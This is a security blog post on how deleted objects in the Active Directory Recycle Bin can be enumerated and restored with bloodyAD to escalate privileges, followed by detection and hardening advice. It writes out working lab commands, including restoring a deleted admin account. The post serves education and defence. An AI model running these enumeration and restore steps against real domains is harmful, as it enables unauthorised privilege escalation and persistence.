---
title: "Have You Looked in the Trash? Unearthing Privilege Escalations from the Active Directory Recycle Bin"
summary: "How overlooked objects in AD's Recycle Bin can become a goldmine for attackers—and what defenders need to know"
date: 2025-06-25

authors:
  - admin

tags:
  - bloodyAD
  - Microsoft

categories:
  - Active Directory
---

_"Have You Looked in the Trash?"_

It's a phrase many of us heard growing up—usually after failing to find something that was right under our noses. In the world of cybersecurity, this advice rings truer than ever, especially when it comes to Active Directory.

The Active Directory Recycle Bin is often treated as a safety net—a place where deleted objects go to rest before permanent removal. But for attackers, it can be a treasure trove of opportunity. Deleted users, groups, and others may still retain critical attributes that can be leveraged for privilege escalation, lateral movement, or persistence.

In this article, we’ll dig into how the AD Recycle Bin works, how attackers can exploit it to gain elevated access, and how defenders can detect and mitigate these risks before they become real threats.

## Understanding the Active Directory Recycle Bin

The [Active Directory Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin?tabs=adac) was introduced in Windows Server 2008 R2 to make object recovery easier and safer. This feature must be explicitly enabled and is irreversible once activated. When an object (like a user or group) is deleted, it isn’t immediately purged—it’s marked as “deleted” and moved to a hidden container. This preserves all attributes like group memberships, permissions, and SID history, allowing for one-click restoration if needed.

[Deleted objects](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_d9c9e99f-74f1-483e-bcb1-310e75ff1344) have a default retention time of 180 days, defined in the _Directory Service_ object (`CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=example,DC=com`) by the [tombstoneLifetime](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1887de08-2a9e-4694-95e2-898cde411180) attribute, unless overridden by _msDS-DeletedObjectLifetime_. If neither attribute is defined, the retention is 60 days (Windows 2000–2008 Server) or only 2 days for 2008 R2 and later.  
Once retention expires, _Deleted objects_ become recycled and their _isRecycled_ attribute is set to `TRUE`. In this state, the object no longer contains all of its attribute data and can only be recovered with tools that interact directly with AD snapshots. This state signals to other DCs during replication that the object is gone.

![Object LifeCycle Diagram](deleted_retention.png "[Object Lifecycle Diagram from Microsoft](https://techcommunity.microsoft.com/blog/askds/the-ad-recycle-bin-understanding-implementing-best-practices-and-troubleshooting/396944)")

If the Recycle Bin is not enabled or the server version is older than 2008 R2, objects are _tombstoned_ instead of being _deleted_. Tombstoned objects appear similar to recycled objects but are restorable. However, they are stripped of most attributes, retaining only their _ObjectSID_, _nTSecurityDescriptor_ (so ACLs linked directly to them stay intact), and, since Windows 2003, their [_sIDHistory_](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/retore-deleted-accounts-and-groups-in-ad#how-to-manually-undelete-objects-in-a-deleted-objects-container), but lose all group memberships.

However, this convenience comes with a hidden cost: security blind spots. Many organizations assume deleted objects are harmless, but they can still be queried, restored, or even abused if not properly managed.

**Key points:**
- Deleted objects retain all their attributes (including sensitive ones)
- Tombstoned objects retain most important attributes
- They are stored in the `CN=Deleted Objects` container
- They can be restored with all their privileges if not recycled or permanently deleted

## Privilege Escalation Vectors

Attackers who gain read access to AD can enumerate deleted objects and look for opportunities to escalate privileges. Examples include:

- **SID History Abuse:** Deleted/tombstoned objects may retain SID history that grants rights on privileged objects.
- **Group Memberships:** Restoring a deleted object can re-enable access to sensitive resources, as it regains all memberships.
- **ACLs and Delegations:** Deleted/tombstoned objects may still be referenced in ACLs or have Kerberos delegations, allowing indirect access or control.
- **Sensitive Information:** Deleted objects may contain sensitive information such as cleartext passwords in fields like `description`, `info`, or custom attributes.

There are many more abuse possibilities (GPO, OU, etc.), and these vectors are often missed in traditional audits, making the Recycle Bin a stealthy attack surface.

## Prerequisites

To list deleted objects, the principal must have the `LIST_CHILD` right on the _Deleted Objects_ container and use the special LDAP control OID `1.2.840.113556.1.4.2064` (shows deleted, tombstoned, and recycled):

```powershell
# List deleted objects with bloodyAD
$ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr ntsecuritydescriptor --base 'CN=Deleted Objects,DC=bloody,DC=corp' --filter "(objectClass=container)"

distinguishedName: CN=Deleted Objects,DC=bloody,DC=corp
[...]
nTSecurityDescriptor.ACL.0.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.0.Trustee: john
nTSecurityDescriptor.ACL.0.Right: LIST_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: Self
[...]

$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name

distinguishedName: CN=test_pc\0ADEL:db0e6105-73a0-44e6-b9ad-a546af714ae5,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc
DEL:db0e6105-73a0-44e6-b9ad-a546af714ae5

distinguishedName: CN=test_pc2\0ADEL:c535b0ea-c822-4920-9452-292824d1f091,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc2
DEL:c535b0ea-c822-4920-9452-292824d1f091

distinguishedName: CN=test_pc3\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc3
DEL:c9e8a129-f77f-4159-b700-3c8fd06963fe
[...]
```

To restore objects, the principal should have:
- **Restore Tombstoned** right on the domain object
- **Generic Write** right on the deleted object
- **Create Child** right on the OU used for restoration  
  (Tip: you can use `--newParent` with bloodyAD to target an OU where you have this right)

```powershell
# Check restore rights
$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'DC=bloody,DC=corp' --attr ntsecuritydescriptor --resolve-sd                   

distinguishedName: DC=bloody,DC=corp
[...]
nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.4.Trustee: john
nTSecurityDescriptor.ACL.4.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.4.ObjectType: Reanimate-Tombstones
[..]

$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=test_pc3$))' --attr ntsecuritydescriptor --resolve-sd

distinguishedName: CN=test_pc3\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_PRESENT|SELF_RELATIVE
[...]
nTSecurityDescriptor.ACL.28.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.28.Trustee: john
nTSecurityDescriptor.ACL.28.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.28.ObjectType: Self
nTSecurityDescriptor.ACL.28.Flags: CONTAINER_INHERIT; INHERITED
[...]

$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'CN=Users,DC=bloody,DC=corp' --attr ntsecuritydescriptor --resolve-sd

distinguishedName: CN=Users,DC=bloody,DC=corp
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
[...]
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: john
nTSecurityDescriptor.ACL.3.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.3.Flags: CONTAINER_INHERIT
[...]
```
{{% callout note %}}
By default, only Domain Admins are able to list and restore deleted objects.
{{% /callout %}}

SharpHound does not retrieve deleted objects even when run as Domain Admin, despite documentation suggesting it could ([see BloodHound docs](https://bloodhound.specterops.io/collect-data/permissions#granting-access-to-the-deleted-objects-container-optional)).  
So BloodHound CE **cannot** detect privilege escalation opportunities from deleted objects.

## Real-World Scenarios

Once an attacker ensures they have enough rights on a deleted object and an OU, and the **Restore Tombstoned** right:

````powershell
$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get writable --include-del
[...]
distinguishedName: CN=garbage.admin\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
permission: WRITE
[...]
DistinguishedName: CN=Users,DC=bloody,DC=corp
permission: CREATE_CHILD
````

They can recover the object easily using the sAMAccountName or objectSID:

````powershell
$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'

[+] S-1-5-21-1394970401-3214794726-2504819329-1104 has been restored successfully under CN=garbage.admin,CN=Users,DC=bloody,DC=corp
````

**Example scenarios:**

- **Scenario 1: Restoring a Deleted Admin User**  
  An attacker with restore privileges brings back a deleted domain admin account. Because the account retains its SID and group memberships, it instantly regains elevated access.

- **Scenario 2: SID History Injection**  
  A deleted user object with a privileged SID history is restored and used to bypass group membership checks.

- **Scenario 3: ACL Exploitation**  
  A deleted group is still referenced in ACLs on critical resources. An attacker restores the group and adds themselves to it, gaining access.

{{% callout note %}}
There is a HTB machine called [TombWatcher](https://www.hackthebox.com/machines/tombwatcher) for those who want to practice.
{{% /callout %}}

## Detection & Defense

To defend against these threats, security teams can:

- **Monitor restore operations**  
  Track who restores objects and when. This can be done via event logs and SIEM integrations.\
  Here's how using the _A directory service object was undeleted_ event 5138 from event logs:
  - With or without Recycle Bin enabled, ensure `Directory Service Changes` audit is enabled:
  ```ps1
  AuditPol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
  ```
  - Or via Group Policy go to:\
  `Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > DS Access  
  Enable Audit Directory Service Changes`
  - The container (e.g., CN=Users) or the domain object must have a System Access Control List (SACL) that audits Create operations. Use Active Directory Users and Computers (ADUC) with Advanced Features enabled. Right-click the `container → Properties → Security → Advanced → Auditing` and add an entry to audit Create operations by ticking the box `Create all child` (don't forget to enable inheritance for the domain object)

  Then check Event Viewer > Windows Logs > Security > [Event 5138](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5138):

  ![Event 5138](event-5138.png)

- **Clean up sensitive attributes**  
  Before deletion, strip objects of privileged group memberships and SID history.

- **Adjust retention time**  
  Retention time is 180 days by default for each state and can be reduced according to company policy by modifying one of these two attributes:

  ````powershell
  $ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp' tombstoneLifetime -v 60
  [+] CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp's tombstoneLifetime has been updated

  $ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp' msDS-DeletedObjectLifetime -v 30
  [+] CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp's msDS-DeletedObjectLifetime has been updated
  ````

- **Force recycled state**  
  Recycled state can be enforced for sensitive objects by deleting them a second time:

  ````powershell
  Get-ADObject -Filter {isDeleted -eq $True -and samaccountname -eq "recycletest"} -IncludeDeletedObjects | Remove-ADObject
  ````

  {{% callout note %}}
  This feature is only available if Recycle Bin is enabled.
  {{% /callout %}}

- **Limit restore permissions**  
  Only trusted admins should have the ability to restore objects.

## Conclusion

The AD Recycle Bin is more than a convenience—it’s a potential attack surface. By _"looking in the trash"_, attackers can uncover privilege escalation paths that defenders often overlook. With proper auditing, monitoring, and policy enforcement, organizations can turn this hidden risk into a manageable one.